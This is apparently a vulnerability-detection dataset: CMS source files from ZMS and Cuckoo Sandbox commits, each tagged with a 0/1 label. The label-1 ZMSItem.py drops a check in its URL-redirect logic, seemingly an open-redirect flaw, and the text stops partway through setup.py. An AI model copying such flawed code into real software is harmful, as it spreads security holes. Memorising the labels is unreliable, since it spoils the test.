    #  ZMSItem.zmi_body_content:
    # --------------------------------------------------------------------------
    def zmi_body_content(self, *args, **kwargs):
      request = self.REQUEST
      response = request.RESPONSE
      return self.getBodyContent(request)

    # --------------------------------------------------------------------------
    #  ZMSItem.zmi_manage_css:
    # --------------------------------------------------------------------------
    def zmi_manage_css(self, *args, **kwargs):
      """""" ZMSItem.zmi_manage_css """"""
      request = self.REQUEST
      response = request.RESPONSE
      response.setHeader('Content-Type','text/css')
      css = []
      for stylesheet in self.getStylesheets():
        try:
          s = stylesheet(self)
        except:
          s = str(stylesheet)
        css.append(""/* ######################################################################"")
        css.append(""   ### %s""%stylesheet.absolute_url())
        css.append(""   ###################################################################### */"")
        css.append(s)
      return '\n'.join(css)

    # --------------------------------------------------------------------------
    #  ZMSItem.zmi_manage_menu:
    # --------------------------------------------------------------------------
    def zmi_manage_menu(self, *args, **kwargs):
      return self.manage_menu(args,kwargs)

    # --------------------------------------------------------------------------
    #  zmi_body_attrs:
    # --------------------------------------------------------------------------
    def zmi_body_class(self, *args, **kwargs):
      request = self.REQUEST
      l = ['zmi']
      l.append(request['lang'])
      l.extend(map(lambda x:kwargs[x],kwargs.keys()))
      l.append(self.meta_id)
      # FOR EVALUATION: adding node specific css classes [list]
      internal_dict = self.attr('internal_dict')
      if isinstance(internal_dict,dict) and internal_dict.get('css_classes',None):
        l.extend( internal_dict['css_classes'] )
      l.extend(request['AUTHENTICATED_USER'].getRolesInContext(self))
      return ' '.join(l)

    # --------------------------------------------------------------------------
    #  ZMSItem.zmi_page_request:
    # --------------------------------------------------------------------------
    def _zmi_page_request(self, *args, **kwargs):
      for daemon in filter(lambda x:IZMSDaemon.IZMSDaemon in list(zope.interface.providedBy(x)),self.getDocumentElement().objectValues()):
        daemon.startDaemon()
      request = self.REQUEST
      request.set( 'ZMS_THIS',self.getSelf())
      request.set( 'ZMS_DOCELMNT',self.breadcrumbs_obj_path()[0])
      request.set( 'ZMS_ROOT',request['ZMS_DOCELMNT'].absolute_url())
      request.set( 'ZMS_COMMON',getattr(self,'common',self.getHome()).absolute_url())
      request.set( 'ZMI_TIME',DateTime().timeTime())
      request.set( 'ZMS_CHARSET',request.get('ZMS_CHARSET','utf-8'))
      if not request.get('HTTP_ACCEPT_CHARSET'):
        request.set('HTTP_ACCEPT_CHARSET','%s;q=0.7,*;q=0.7'%request['ZMS_CHARSET'])
      if (request.get('ZMS_PATHCROPPING',False) or self.getConfProperty('ZMS.pathcropping',0)==1) and request.get('export_format','')=='':
        base = request.get('BASE0','')
        if request['ZMS_ROOT'].startswith(base):
          request.set( 'ZMS_ROOT',request['ZMS_ROOT'][len(base):])
          request.set( 'ZMS_COMMON',request['ZMS_COMMON'][len(base):])
    
    def zmi_page_request(self, *args, **kwargs):
      request = self.REQUEST
      RESPONSE = request.RESPONSE
      SESSION = request.SESSION
      self._zmi_page_request()
      RESPONSE.setHeader('Expires',DateTime(request['ZMI_TIME']-10000).toZone('GMT+1').rfc822())
      RESPONSE.setHeader('Cache-Control', 'no-cache')
      RESPONSE.setHeader('Pragma', 'no-cache')
      RESPONSE.setHeader('Content-Type', 'text/html;charset=%s'%request['ZMS_CHARSET'])
      if not request.get( 'preview'):
        request.set( 'preview','preview')
      langs = self.getLanguages(request)
      if request.get('lang') not in langs:
        request.set('lang',langs[0])
      if request.get('manage_lang') not in self.getLocale().get_manage_langs():
        request.set('manage_lang',self.get_manage_lang())
      if not request.get('manage_tabs_message'):
        request.set( 'manage_tabs_message',self.getConfProperty('ZMS.manage_tabs_message',''))
      # manage_system
      if request.form.has_key('zmi-manage-system'):
        request.SESSION.set('zmi-manage-system',int(request.get('zmi-manage-system')))
      # avoid declarative urls
      physical_path = self.getPhysicalPath()
      path_to_handle = request['URL0'][len(request['BASE0']):].split('/')
      path = path_to_handle[:-1]
      if self.getDocumentElement().id in path and len(filter(lambda x:x.find('.')>0 or x.startswith('manage_'),path))==0:
        for i in range(len(path)):
          if path[:-(i+1)] != physical_path[:-(i+1)]:
            path[:-(i+1)] = physical_path[:-(i+1)]
        new_path = path+[path_to_handle[-1]]
        if path_to_handle != new_path:
          request.RESPONSE.redirect('/'.join(new_path))

    def f_standard_html_request(self, *args, **kwargs):
      request = self.REQUEST
      self._zmi_page_request()
      if not request.get( 'lang'):
        request.set( 'lang',self.getLanguage(request))
      if not request.get('manage_lang') in self.getLocale().get_manage_langs():
        request.set( 'manage_lang',self.get_manage_lang())


    # --------------------------------------------------------------------------
    #  ZMSItem.display_icon:
    #
    #  @param REQUEST
    # --------------------------------------------------------------------------
    def display_icon(self, REQUEST, meta_type=None, key='icon', zpt=None):
      if meta_type is None:
        return self.icon
      else:
        return self.aq_parent.display_icon( REQUEST, meta_type, key, zpt)


    # --------------------------------------------------------------------------
    #  ZMSItem.getTitlealt
    # --------------------------------------------------------------------------
    def getTitlealt( self, REQUEST):
      return self.getZMILangStr( self.meta_type)


    # --------------------------------------------------------------------------
    #  ZMSItem.breadcrumbs_obj_path:
    # --------------------------------------------------------------------------
    def breadcrumbs_obj_path(self, portalMaster=True):
      return self.aq_parent.breadcrumbs_obj_path(portalMaster)

################################################################################/n/n/n",0
69,3f28620d475220dfdb06f79787158ac50727c61a,"/ZMSItem.py/n/n################################################################################
# ZMSItem.py
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.
################################################################################

# Imports.
from DateTime.DateTime import DateTime
from Products.PageTemplates.PageTemplateFile import PageTemplateFile
from Persistence import Persistent
from Acquisition import Implicit
import OFS.SimpleItem, OFS.ObjectManager
import zope.interface
# Product Imports.
import IZMSDaemon


################################################################################
################################################################################
###
###   Abstract Class ZMSItem
###
################################################################################
################################################################################
class ZMSItem(
    OFS.ObjectManager.ObjectManager,
    OFS.SimpleItem.Item,
    Persistent,  # Persistent.
    Implicit,    # Acquisition.
    ):

    # Documentation string.
    __doc__ = """"""ZMS product module.""""""
    # Version string. 
    __version__ = '0.1' 
    
    # Management Permissions.
    # -----------------------
    __authorPermissions__ = (
      'manage_page_header', 'manage_page_footer', 'manage_tabs', 'manage_main_iframe' 
      )
    __viewPermissions__ = (
      'manage_menu',
      )
    __ac_permissions__=(
      ('ZMS Author', __authorPermissions__),
      ('View', __viewPermissions__),
      )

    # Templates.
    # ----------
    manage = PageTemplateFile('zpt/object/manage', globals())
    manage_workspace = PageTemplateFile('zpt/object/manage', globals())
    manage_main = PageTemplateFile('zpt/ZMSObject/manage_main', globals())
    manage_main_iframe = PageTemplateFile('zpt/ZMSObject/manage_main_iframe', globals())

    # --------------------------------------------------------------------------
    #  ZMSItem.zmi_body_content:
    # --------------------------------------------------------------------------
    def zmi_body_content(self, *args, **kwargs):
      request = self.REQUEST
      response = request.RESPONSE
      return self.getBodyContent(request)

    # --------------------------------------------------------------------------
    #  ZMSItem.zmi_manage_css:
    # --------------------------------------------------------------------------
    def zmi_manage_css(self, *args, **kwargs):
      """""" ZMSItem.zmi_manage_css """"""
      request = self.REQUEST
      response = request.RESPONSE
      response.setHeader('Content-Type','text/css')
      css = []
      for stylesheet in self.getStylesheets():
        try:
          s = stylesheet(self)
        except:
          s = str(stylesheet)
        css.append(""/* ######################################################################"")
        css.append(""   ### %s""%stylesheet.absolute_url())
        css.append(""   ###################################################################### */"")
        css.append(s)
      return '\n'.join(css)

    # --------------------------------------------------------------------------
    #  ZMSItem.zmi_manage_menu:
    # --------------------------------------------------------------------------
    def zmi_manage_menu(self, *args, **kwargs):
      return self.manage_menu(args,kwargs)

    # --------------------------------------------------------------------------
    #  zmi_body_attrs:
    # --------------------------------------------------------------------------
    def zmi_body_class(self, *args, **kwargs):
      request = self.REQUEST
      l = ['zmi']
      l.append(request['lang'])
      l.extend(map(lambda x:kwargs[x],kwargs.keys()))
      l.append(self.meta_id)
      # FOR EVALUATION: adding node specific css classes [list]
      internal_dict = self.attr('internal_dict')
      if isinstance(internal_dict,dict) and internal_dict.get('css_classes',None):
        l.extend( internal_dict['css_classes'] )
      l.extend(request['AUTHENTICATED_USER'].getRolesInContext(self))
      return ' '.join(l)

    # --------------------------------------------------------------------------
    #  ZMSItem.zmi_page_request:
    # --------------------------------------------------------------------------
    def _zmi_page_request(self, *args, **kwargs):
      for daemon in filter(lambda x:IZMSDaemon.IZMSDaemon in list(zope.interface.providedBy(x)),self.getDocumentElement().objectValues()):
        daemon.startDaemon()
      request = self.REQUEST
      request.set( 'ZMS_THIS',self.getSelf())
      request.set( 'ZMS_DOCELMNT',self.breadcrumbs_obj_path()[0])
      request.set( 'ZMS_ROOT',request['ZMS_DOCELMNT'].absolute_url())
      request.set( 'ZMS_COMMON',getattr(self,'common',self.getHome()).absolute_url())
      request.set( 'ZMI_TIME',DateTime().timeTime())
      request.set( 'ZMS_CHARSET',request.get('ZMS_CHARSET','utf-8'))
      if not request.get('HTTP_ACCEPT_CHARSET'):
        request.set('HTTP_ACCEPT_CHARSET','%s;q=0.7,*;q=0.7'%request['ZMS_CHARSET'])
      if (request.get('ZMS_PATHCROPPING',False) or self.getConfProperty('ZMS.pathcropping',0)==1) and request.get('export_format','')=='':
        base = request.get('BASE0','')
        if request['ZMS_ROOT'].startswith(base):
          request.set( 'ZMS_ROOT',request['ZMS_ROOT'][len(base):])
          request.set( 'ZMS_COMMON',request['ZMS_COMMON'][len(base):])
    
    def zmi_page_request(self, *args, **kwargs):
      request = self.REQUEST
      RESPONSE = request.RESPONSE
      SESSION = request.SESSION
      self._zmi_page_request()
      RESPONSE.setHeader('Expires',DateTime(request['ZMI_TIME']-10000).toZone('GMT+1').rfc822())
      RESPONSE.setHeader('Cache-Control', 'no-cache')
      RESPONSE.setHeader('Pragma', 'no-cache')
      RESPONSE.setHeader('Content-Type', 'text/html;charset=%s'%request['ZMS_CHARSET'])
      if not request.get( 'preview'):
        request.set( 'preview','preview')
      langs = self.getLanguages(request)
      if request.get('lang') not in langs:
        request.set('lang',langs[0])
      if request.get('manage_lang') not in self.getLocale().get_manage_langs():
        request.set('manage_lang',self.get_manage_lang())
      if not request.get('manage_tabs_message'):
        request.set( 'manage_tabs_message',self.getConfProperty('ZMS.manage_tabs_message',''))
      # manage_system
      if request.form.has_key('zmi-manage-system'):
        request.SESSION.set('zmi-manage-system',int(request.get('zmi-manage-system')))
      # avoid declarative urls
      physical_path = self.getPhysicalPath()
      path_to_handle = request['URL0'][len(request['BASE0']):].split('/')
      path = path_to_handle[:-1]
      if len(filter(lambda x:x.find('.')>0 or x.startswith('manage_'),path))==0:
        for i in range(len(path)):
          if path[:-(i+1)] != physical_path[:-(i+1)]:
            path[:-(i+1)] = physical_path[:-(i+1)]
        new_path = path+[path_to_handle[-1]]
        if path_to_handle != new_path:
          request.RESPONSE.redirect('/'.join(new_path))

    def f_standard_html_request(self, *args, **kwargs):
      request = self.REQUEST
      self._zmi_page_request()
      if not request.get( 'lang'):
        request.set( 'lang',self.getLanguage(request))
      if not request.get('manage_lang') in self.getLocale().get_manage_langs():
        request.set( 'manage_lang',self.get_manage_lang())


    # --------------------------------------------------------------------------
    #  ZMSItem.display_icon:
    #
    #  @param REQUEST
    # --------------------------------------------------------------------------
    def display_icon(self, REQUEST, meta_type=None, key='icon', zpt=None):
      if meta_type is None:
        return self.icon
      else:
        return self.aq_parent.display_icon( REQUEST, meta_type, key, zpt)


    # --------------------------------------------------------------------------
    #  ZMSItem.getTitlealt
    # --------------------------------------------------------------------------
    def getTitlealt( self, REQUEST):
      return self.getZMILangStr( self.meta_type)


    # --------------------------------------------------------------------------
    #  ZMSItem.breadcrumbs_obj_path:
    # --------------------------------------------------------------------------
    def breadcrumbs_obj_path(self, portalMaster=True):
      return self.aq_parent.breadcrumbs_obj_path(portalMaster)

################################################################################/n/n/n",1
70,168cabf86730d56b7fa319278bf0f0034052666a,"cuckoo/core/submit.py/n/n# Copyright (C) 2016-2017 Cuckoo Foundation.
# This file is part of Cuckoo Sandbox - http://www.cuckoosandbox.org
# See the file 'docs/LICENSE' for copying permission.

import copy
import logging
import os
import sflock

from cuckoo.common.config import emit_options
from cuckoo.common.exceptions import CuckooOperationalError
from cuckoo.common.files import Folders, Files, Storage
from cuckoo.common.utils import validate_url, validate_hash
from cuckoo.common.virustotal import VirusTotalAPI
from cuckoo.core.database import Database

log = logging.getLogger(__name__)

db = Database()

class SubmitManager(object):
    def _handle_string(self, submit, tmppath, line):
        if not line:
            return

        if validate_hash(line):
            try:
                filedata = VirusTotalAPI().hash_fetch(line)
            except CuckooOperationalError as e:
                submit[""errors""].append(
                    ""Error retrieving file hash: %s"" % e
                )
                return

            filepath = Files.create(tmppath, line, filedata)

            submit[""data""].append({
                ""type"": ""file"",
                ""data"": filepath
            })
            return

        if validate_url(line):
            submit[""data""].append({
                ""type"": ""url"",
                ""data"": line
            })
            return

        submit[""errors""].append(
            ""'%s' was neither a valid hash or url"" % line
        )

    def pre(self, submit_type, data):
        """"""
        The first step to submitting new analysis.
        @param submit_type: ""files"" or ""strings""
        @param data: a list of dicts containing ""name"" (file name)
                and ""data"" (file data) or a list of strings (urls or hashes)
        @return: submit id
        """"""
        if submit_type not in (""strings"", ""files""):
            log.error(""Bad parameter '%s' for submit_type"", submit_type)
            return False

        path_tmp = Folders.create_temp()
        submit_data = {
            ""data"": [],
            ""errors"": []
        }

        if submit_type == ""strings"":
            for line in data:
                self._handle_string(submit_data, path_tmp, line)

        if submit_type == ""files"":
            for entry in data:
                filename = Storage.get_filename_from_path(entry[""name""])
                filepath = Files.create(path_tmp, filename, entry[""data""])
                submit_data[""data""].append({
                    ""type"": ""file"",
                    ""data"": filepath
                })

        return Database().add_submit(path_tmp, submit_type, submit_data)

    def get_files(self, submit_id, password=None, astree=False):
        """"""
        Returns files from a submitted analysis.
        @param password: The password to unlock container archives with
        @param astree: sflock option; determines the format in which the files are returned
        @return: A tree of files
        """"""
        submit = Database().view_submit(submit_id)
        files, duplicates = [], []

        for data in submit.data[""data""]:
            if data[""type""] == ""file"":
                filename = Storage.get_filename_from_path(data[""data""])
                filepath = os.path.join(submit.tmp_path, filename)

                unpacked = sflock.unpack(
                    filepath=filepath, password=password, duplicates=duplicates
                )

                if astree:
                    unpacked = unpacked.astree(sanitize=True)

                files.append(unpacked)
            elif data[""type""] == ""url"":
                files.append({
                    ""filename"": data[""data""],
                    ""filepath"": """",
                    ""relapath"": """",
                    ""selected"": True,
                    ""size"": 0,
                    ""type"": ""url"",
                    ""package"": ""ie"",
                    ""extrpath"": [],
                    ""duplicate"": False,
                    ""children"": [],
                    ""mime"": ""text/html"",
                    ""finger"": {
                        ""magic_human"": ""url"",
                        ""magic"": ""url""
                    }
                })
            else:
                raise RuntimeError(
                    ""Unknown data entry type: %s"" % data[""type""]
                )

        return files

    def translate_options(self, info, options):
        """"""Translates Web Interface options to Cuckoo database options.""""""
        ret = {}

        if not int(options[""simulated-human-interaction""]):
            ret[""human""] = int(options[""simulated-human-interaction""])

        return emit_options(ret)

    def submit(self, submit_id, config):
        """"""Reads, interprets, and converts the JSON configuration provided by
        the Web Interface into something we insert into the database.""""""
        ret = []
        submit = db.view_submit(submit_id)

        for entry in config[""file_selection""]:
            # Merge the global & per-file analysis options.
            info = copy.deepcopy(config[""global""])
            info.update(entry)
            options = copy.deepcopy(config[""global""][""options""])
            options.update(entry.get(""options"", {}))

            kw = {
                ""package"": info.get(""package""),
                ""timeout"": info.get(""timeout"", 120),
                ""priority"": info.get(""priority""),
                ""custom"": info.get(""custom""),
                ""owner"": info.get(""owner""),
                ""tags"": info.get(""tags""),
                ""memory"": info.get(""memory""),
                ""enforce_timeout"": options.get(""enforce-timeout""),
                ""machine"": info.get(""machine""),
                ""platform"": info.get(""platform""),
                ""options"": self.translate_options(info, options),
                ""submit_id"": submit_id,
            }

            if entry[""type""] == ""url"":
                ret.append(db.add_url(
                    url=info[""filename""], **kw
                ))
                continue

            # for each selected file entry, create a new temp. folder
            path_dest = Folders.create_temp()

            if not info[""extrpath""]:
                path = os.path.join(
                    submit.tmp_path, os.path.basename(info[""filename""])
                )

                filepath = Files.copy(path, path_dest=path_dest)

                ret.append(db.add_path(
                    file_path=filepath, **kw
                ))
            elif len(info[""extrpath""]) == 1:
                arcpath = os.path.join(
                    submit.tmp_path, os.path.basename(info[""arcname""])
                )
                if not os.path.exists(arcpath):
                    submit.data[""errors""].append(
                        ""Unable to find parent archive file: %s"" %
                        os.path.basename(info[""arcname""])
                    )
                    continue

                arc = sflock.zipify(sflock.unpack(
                    info[""arcname""], contents=open(arcpath, ""rb"").read()
                ))

                # Create a .zip archive out of this container.
                arcpath = Files.temp_named_put(
                    arc, os.path.basename(info[""arcname""])
                )

                ret.append(db.add_archive(
                    file_path=arcpath, filename=info[""filename""], **kw
                ))
            else:
                arcpath = os.path.join(
                    submit.tmp_path, os.path.basename(info[""arcname""])
                )
                if not os.path.exists(arcpath):
                    submit.data[""errors""].append(
                        ""Unable to find parent archive file: %s"" %
                        os.path.basename(info[""arcname""])
                    )
                    continue

                content = sflock.unpack(arcpath).read(info[""extrpath""][:-1])
                subarc = sflock.unpack(info[""extrpath""][-2], contents=content)

                # Write intermediate .zip archive file.
                arcpath = Files.temp_named_put(
                    sflock.zipify(subarc),
                    os.path.basename(info[""extrpath""][-2])
                )

                ret.append(db.add_archive(
                    file_path=arcpath, filename=info[""filename""], **kw
                ))

        return ret
/n/n/ncuckoo/web/controllers/analysis/analysis.py/n/n# Copyright (C) 2010-2013 Claudio Guarnieri.
# Copyright (C) 2014-2017 Cuckoo Foundation.
# This file is part of Cuckoo Sandbox - http://www.cuckoosandbox.org
# See the file 'docs/LICENSE' for copying permission.

import collections
import os
import pymongo

from django.http import Http404

from cuckoo.common.mongo import mongo
from cuckoo.core.database import Database, TASK_PENDING

db = Database()

class AnalysisController:
    @staticmethod
    def task_info(task_id):
        if not isinstance(task_id, int):
            raise Exception(""Task ID should be integer"")

        task = db.view_task(task_id, details=True)
        if not task:
            return Http404(""Task not found"")

        entry = task.to_dict()
        entry[""guest""] = {}
        if task.guest:
            entry[""guest""] = task.guest.to_dict()

        entry[""errors""] = []
        for error in task.errors:
            entry[""errors""].append(error.message)

        entry[""sample""] = {}
        if task.sample_id:
            sample = db.view_sample(task.sample_id)
            entry[""sample""] = sample.to_dict()

        entry[""target""] = os.path.basename(entry[""target""])
        return {
            ""task"": entry,
        }

    @staticmethod
    def get_recent(limit=50, offset=0):
        tasks_files = db.list_tasks(
            limit=limit,
            offset=offset,
            category=""file"",
            not_status=TASK_PENDING)

        tasks_urls = db.list_tasks(
            limit=limit,
            offset=offset,
            category=""url"",
            not_status=TASK_PENDING)

        data = []
        if tasks_files:
            for task in tasks_files:
                new = task.to_dict()
                new[""sample""] = db.view_sample(new[""sample_id""]).to_dict()

                filename = os.path.basename(new[""target""])
                new.update({""filename"": filename})

                if db.view_errors(task.id):
                    new[""errors""] = True

                data.append(new)

        if tasks_urls:
            for task in tasks_urls:
                new = task.to_dict()

                if db.view_errors(task.id):
                    new[""errors""] = True

                data.append(new)

        return data

    @staticmethod
    def get_report(task_id):
        report = AnalysisController._get_report(task_id)
        if not report:
            raise Http404(""the specified analysis does not exist"")

        data = {
            ""analysis"": report
        }

        dnsinfo = AnalysisController._get_dnsinfo(report)
        data.update(dnsinfo)
        return data

    @staticmethod
    def _get_report(task_id):
        return mongo.db.analysis.find_one({
            ""info.id"": int(task_id)
        }, sort=[(""_id"", pymongo.DESCENDING)])

    @staticmethod
    def get_reports(filters):
        cursor = mongo.db.analysis.find(
            filters, sort=[(""_id"", pymongo.DESCENDING)]
        )
        return [report for report in cursor]

    @staticmethod
    def _get_dnsinfo(report):
        """"""Create DNS information dicts by domain and ip""""""

        if ""network"" in report and ""domains"" in report[""network""]:
            domainlookups = dict((i[""domain""], i[""ip""]) for i in report[""network""][""domains""])
            iplookups = dict((i[""ip""], i[""domain""]) for i in report[""network""][""domains""])

            for i in report[""network""][""dns""]:
                for a in i[""answers""]:
                    iplookups[a[""data""]] = i[""request""]
        else:
            domainlookups = dict()
            iplookups = dict()

        return {
            ""domainlookups"": domainlookups,
            ""iplookups"": iplookups,
        }

    @staticmethod
    def get_behavior(task_id, report=None):
        """"""
        Returns behavioral information about an analysis
        sorted by category (files, registry, mutexes, etc)
        @param task_id: The analysis ID
        @param report: JSON analysis blob that is stored in MongoDB (results.json)
        @return: behavioral information as a dict
        """"""
        data = {}
        if not report:
            report = AnalysisController.get_report(task_id)[""analysis""]
        procs = AnalysisController.behavior_get_processes(task_id, report)

        for proc in procs[""data""]:
            pid = proc[""pid""]
            pname = proc[""process_name""]
            pdetails = None
            for p in report[""behavior""][""generic""]:
                if p[""pid""] == pid:
                    pdetails = p
            if not pdetails:
                continue

            watchers = AnalysisController.behavior_get_watchers(
                task_id, pid=pid, report=report)

            for category, events in watchers.iteritems():
                if not data.has_key(category):
                    data[category] = {}
                if not data[category].has_key(pid):
                    data[category][pname] = {
                        ""pid"": pid,
                        ""process_name"": pname,
                        ""events"": {}
                    }

                for event in events:
                    if not data[category][pname][""events""].has_key(event):
                        data[category][pname][""events""][event] = []
                    for _event in pdetails[""summary""][event]:
                        data[category][pname][""events""][event].append(_event)

        return data

    @staticmethod
    def behavior_get_processes(task_id, report=None):
        if not task_id:
            raise Exception(""missing task_id"")
        if not report:
            report = AnalysisController.get_report(task_id)[""analysis""]

        data = {
            ""data"": [],
            ""status"": True
        }

        for process in report.get(""behavior"", {}).get(""generic"", []):
            data[""data""].append({
                ""process_name"": process[""process_name""],
                ""pid"": process[""pid""]
            })

        # sort returning list of processes by their name
        data[""data""] = sorted(data[""data""], key=lambda k: k[""process_name""])

        return data

    @staticmethod
    def behavior_get_watchers(task_id, pid, report=None):
        if not task_id or not pid:
            raise Exception(""missing task_id or pid"")
        if not report:
            report = AnalysisController.get_report(task_id)[""analysis""]

        behavior_generic = report[""behavior""][""generic""]
        process = [z for z in behavior_generic if z[""pid""] == pid]

        if not process:
            raise Exception(""missing pid"")
        else:
            process = process[0]

        data = {}
        for category, watchers in AnalysisController.behavioral_mapping().iteritems():
            for watcher in watchers:
                if watcher in process[""summary""]:
                    if category not in data:
                        data[category] = [watcher]
                    else:
                        data[category].append(watcher)

        return data

    @staticmethod
    def behavior_get_watcher(task_id, pid, watcher, limit=None, offset=0, report=None):
        if not task_id or not watcher or not pid:
            raise Exception(""missing task_id, watcher, and/or pid"")
        if not report:
            report = AnalysisController.get_report(task_id)[""analysis""]

        behavior_generic = report[""behavior""][""generic""]
        process = [z for z in behavior_generic if z[""pid""] == pid]

        if not process:
            raise Exception(""supplied pid not found"")
        else:
            process = process[0]

        summary = process[""summary""]

        if watcher not in summary:
            raise Exception(""supplied watcher not found"")
        if offset:
            summary[watcher] = summary[watcher][offset:]
        if limit:
            summary[watcher] = summary[watcher][:limit]

        return summary[watcher]

    @staticmethod
    def behavioral_mapping():
        return {
            ""files"":
                [""file_opened"", ""file_read""],
            ""registry"":
                [""regkey_opened"", ""regkey_written"", ""regkey_read""],
            ""mutexes"":
                [""mutex""],
            ""directories"":
                [""directory_created"", ""directory_removed"", ""directory_enumerated""],
            ""processes"":
                [""command_line"", ""dll_loaded""],
        }

    @staticmethod
    def signatures(task_id, signatures=None):
        """"""Returns an OrderedDict containing a lists with signatures based on severity""""""
        if not task_id:
            raise Exception(""missing task_id"")
        if not signatures:
            signatures = AnalysisController.get_report(task_id)[""signatures""]

        data = collections.OrderedDict()
        for signature in signatures:
            severity = signature[""severity""]
            if severity > 3:
                severity = 3
            if not data.has_key(severity):
                data[severity] = []
            data[severity].append(signature)
        return data
/n/n/ncuckoo/web/controllers/submission/api.py/n/n# Copyright (C) 2010-2013 Claudio Guarnieri.
# Copyright (C) 2014-2017 Cuckoo Foundation.
# This file is part of Cuckoo Sandbox - http://www.cuckoosandbox.org
# See the file 'docs/LICENSE' for copying permission.

import json

from django.http import JsonResponse
from django.shortcuts import redirect
from django.views.decorators.csrf import csrf_exempt
from django.views.decorators.http import require_http_methods

from cuckoo.common.config import config
from cuckoo.core.submit import SubmitManager
from cuckoo.web.bin.utils import api_post, JsonSerialize, json_error_response

submit_manager = SubmitManager()

def defaults():
    machinery = config(""cuckoo:cuckoo:machinery"")

    if config(""routing:vpn:enabled""):
        vpns = config(""routing:vpn:vpns"")
    else:
        vpns = []

    return {
        ""machine"": config(""%s:%s:machines"" % (machinery, machinery)),
        ""package"": None,
        ""priority"": 2,
        ""timeout"": config(""cuckoo:timeouts:default""),
        ""routing"": {
            ""route"": config(""routing:routing:route""),
            ""inetsim"": config(""routing:inetsim:enabled""),
            ""tor"": config(""routing:tor:enabled""),
            ""vpns"": vpns,
        },
        ""options"": {
            ""enable-services"": False,
            ""enforce-timeout"": False,
            ""full-memory-dump"": config(""cuckoo:cuckoo:memory_dump""),
            ""no-injection"": False,
            ""process-memory-dump"": True,
            ""simulated-human-interaction"": True,
        },
    }

class SubmissionApi(object):
    @staticmethod
    @csrf_exempt
    @require_http_methods([""POST""])
    def presubmit(request):
        files = request.FILES.getlist(""files[]"")
        data = []

        if files:
            for f in files:
                data.append({
                    ""name"": f.name,
                    ""data"": f.file,
                })

            submit_id = submit_manager.pre(submit_type=""files"", data=data)
            return redirect(""submission/pre"", submit_id=submit_id)
        else:
            body = json.loads(request.body)
            submit_type = body[""type""]

            if submit_type != ""strings"":
                return json_error_response(""type not \""strings\"""")

            submit_id = submit_manager.pre(
                submit_type=submit_type, data=body[""data""].split(""\n"")
            )

            return JsonResponse({
                ""status"": True,
                ""submit_id"": submit_id,
            }, encoder=JsonSerialize)

    @api_post
    def get_files(request, body):
        submit_id = body.get(""submit_id"", 0)
        password = body.get(""password"", None)
        astree = body.get(""astree"", True)

        files = submit_manager.get_files(
            submit_id=submit_id,
            password=password,
            astree=astree
        )

        return JsonResponse({
            ""status"": True,
            ""files"": files,
            ""defaults"": defaults(),
        }, encoder=JsonSerialize)

    @api_post
    def submit(request, body):
        submit_id = body.pop(""submit_id"", None)
        submit_manager.submit(
            submit_id=submit_id, config=body
        )
        return JsonResponse({
            ""status"": True,
            ""submit_id"": submit_id,
        }, encoder=JsonSerialize)
/n/n/nsetup.py/n/n#!/usr/bin/env python
# Copyright (C) 2016-2017 Cuckoo Foundation.
# This file is part of Cuckoo Sandbox - https://cuckoosandbox.org/.
# See the file 'docs/LICENSE' for copying permission.

import os
import setuptools
import sys

# Update the MANIFEST.in file to include the one monitor version that is
# actively shipped for this distribution and exclude all the other monitors
# that we have lying around. Note: I tried to do this is in a better manner
# through exclude_package_data, but without much luck.

excl, monitor = [], os.path.join(""cuckoo"", ""data"", ""monitor"")
latest = open(os.path.join(monitor, ""latest""), ""rb"").read().strip()
for h in os.listdir(monitor):
    if h != ""latest"" and h != latest:
        excl.append(
            ""recursive-exclude cuckoo/data/monitor/%s *  # AUTOGENERATED"" % h
        )

if not os.path.isdir(os.path.join(monitor, latest)) and \
        not os.environ.get(""ONLYINSTALL""):
    sys.exit(
        ""Failure locating the monitoring binaries that belong to the latest ""
        ""monitor release. Please include those to create a distribution.""
    )

manifest = []
for line in open(""MANIFEST.in"", ""rb""):
    if not line.strip() or ""# AUTOGENERATED"" in line:
        continue

    manifest.append(line.strip())

manifest.extend(excl)

open(""MANIFEST.in"", ""wb"").write(""\n"".join(manifest) + ""\n"")

def githash():
    """"""Extracts the current Git hash.""""""
    git_head = os.path.join("".git"", ""HEAD"")
    if os.path.exists(git_head):
        head = open(git_head, ""rb"").read().strip()
        if not head.startswith(""ref: ""):
            return head

        git_ref = os.path.join("".git"", head.split()[1])
        if os.path.exists(git_ref):
            return open(git_ref, ""rb"").read().strip()

cwd_path = os.path.join(""cuckoo"", ""data-private"", "".cwd"")
open(cwd_path, ""wb"").write(githash() or """")

install_requires = []

# M2Crypto relies on swig being installed. We also don't support the latest
# version of SWIG. We should be replacing M2Crypto by something else when
# the time allows us to do so.
if os.path.exists(""/usr/bin/swig""):
    install_requires.append(""m2crypto==0.24.0"")

setuptools.setup(
    name=""Cuckoo"",
    version=""2.0.0"",
    author=""Stichting Cuckoo Foundation"",
    author_email=""cuckoo@cuckoofoundation.org"",
    packages=[
        ""cuckoo"",
    ],
    classifiers=[
        ""Development Status :: 4 - Beta"",
        # TODO: should become stable.
        # ""Development Status :: 5 - Production/Stable"",
        ""Environment :: Console"",
        ""Environment :: Web Environment"",
        ""Framework :: Django"",
        ""Framework :: Flask"",
        ""Framework :: Pytest"",
        ""Intended Audience :: Information Technology"",
        ""Intended Audience :: Science/Research"",
        ""Natural Language :: English"",
        ""License :: OSI Approved :: GNU General Public License v3 (GPLv3)"",
        ""Operating System :: POSIX :: Linux"",
        ""Programming Language :: Python :: 2.7"",
        ""Topic :: Security"",
    ],
    url=""https://cuckoosandbox.org/"",
    license=""GPLv3"",
    description=""Automated Malware Analysis System"",
    include_package_data=True,
    entry_points={
        ""console_scripts"": [
            ""cuckoo = cuckoo.main:main"",
        ],
    },
    install_requires=[
        ""alembic==0.8.8"",
        ""androguard==3.0"",
        ""beautifulsoup4==4.4.1"",
        ""chardet==2.3.0"",
        ""click==6.6"",
        ""django==1.8.4"",
        ""django_extensions==1.6.7"",
        ""dpkt==1.8.7"",
        ""elasticsearch==2.2.0"",
        ""flask==0.10.1"",
        ""httpreplay==0.1.18"",
        ""jinja2==2.8"",
        ""jsbeautifier==1.6.2"",
        ""lxml==3.6.0"",
